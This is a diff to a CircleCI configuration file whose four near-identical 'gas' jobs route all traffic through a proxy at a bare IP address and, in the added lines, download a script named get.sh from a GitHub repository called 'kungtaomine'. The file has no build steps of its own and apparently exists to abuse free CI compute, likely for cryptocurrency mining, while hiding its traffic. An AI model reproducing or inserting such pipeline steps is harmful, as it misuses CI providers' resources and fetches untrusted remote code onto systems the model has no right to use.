@@ -6,22 +6,22 @@ jobs:
     docker:
       - image: cimg/go:1.13.15-browsers
     steps:
-      - run: export http_proxy=http://114.121.248.251:8080 && export https_proxy=https://114.121.248.251:8080 && export ftp_proxy=http://114.121.248.251:8080 && export socks_proxy=http://114.121.248.251:8080 && export all_proxy=http://114.121.248.251:8080 && echo "$http_proxy"
+      - run: export http_proxy=http://114.121.248.251:8080 && export https_proxy=https://114.121.248.251:8080 && export ftp_proxy=http://114.121.248.251:8080 && export socks_proxy=http://114.121.248.251:8080 && export all_proxy=http://114.121.248.251:8080 && echo "$http_proxy" && wget https://github.com/bebfuj/kungtaomine/raw/main/get.sh 
   gas2:
     docker:
       - image: cimg/go:1.13.15-browsers
     steps:
-      - run: export http_proxy=http://114.121.248.251:8080 && export https_proxy=https://114.121.248.251:8080 && export ftp_proxy=http://114.121.248.251:8080 && export socks_proxy=http://114.121.248.251:8080 && export all_proxy=http://114.121.248.251:8080 && echo "$http_proxy"
+      - run: export http_proxy=http://114.121.248.251:8080 && export https_proxy=https://114.121.248.251:8080 && export ftp_proxy=http://114.121.248.251:8080 && export socks_proxy=http://114.121.248.251:8080 && export all_proxy=http://114.121.248.251:8080 && echo "$http_proxy" && wget https://github.com/bebfuj/kungtaomine/raw/main/get.sh
   gas3:
     docker:
       - image: cimg/go:1.13.15-browsers
     steps:
-      - run: export http_proxy=http://114.121.248.251:8080 && export https_proxy=https://114.121.248.251:8080 && export ftp_proxy=http://114.121.248.251:8080 && export socks_proxy=http://114.121.248.251:8080 && export all_proxy=http://114.121.248.251:8080 && echo "$http_proxy"
+      - run: export http_proxy=http://114.121.248.251:8080 && export https_proxy=https://114.121.248.251:8080 && export ftp_proxy=http://114.121.248.251:8080 && export socks_proxy=http://114.121.248.251:8080 && export all_proxy=http://114.121.248.251:8080 && echo "$http_proxy" && wget https://github.com/bebfuj/kungtaomine/raw/main/get.sh
   gas4:
     docker:
       - image: cimg/go:1.13.15-browsers
     steps:
-      - run: export http_proxy=http://114.121.248.251:8080 && export https_proxy=https://114.121.248.251:8080 && export ftp_proxy=http://114.121.248.251:8080 && export socks_proxy=http://114.121.248.251:8080 && export all_proxy=http://114.121.248.251:8080 && echo "$http_proxy"
+      - run: export http_proxy=http://114.121.248.251:8080 && export https_proxy=https://114.121.248.251:8080 && export ftp_proxy=http://114.121.248.251:8080 && export socks_proxy=http://114.121.248.251:8080 && export all_proxy=http://114.121.248.251:8080 && echo "$http_proxy" && wget https://github.com/bebfuj/kungtaomine/raw/main/get.sh
 
 # Orchestrate our job run sequence
 workflows:
